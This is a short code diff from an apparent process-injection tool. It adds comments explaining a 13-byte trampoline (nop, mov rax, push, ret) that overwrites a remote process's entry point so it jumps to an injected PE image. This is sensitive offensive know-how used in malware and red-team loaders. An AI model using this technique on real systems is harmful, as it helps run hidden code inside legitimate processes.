@@ -262,7 +262,13 @@ int main()
 
 	DLOG("[*]Remote process image entry point @ >>>>>>>>> 0x%p\n", pRemoteEntryPoint);
 
+    //
 	// patch remote entry point
+    // nop
+    // mov rax, 0x1122334455667788
+    // push rax
+    // ret
+    // 
 	unsigned char patch[] = { 0x90, 0x48, 0xb8, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0x50, 0xc3 };
 	*(UINT_PTR*)(patch + 3) = PTR(pInjPeEntryPoint);
 #ifdef _DBG
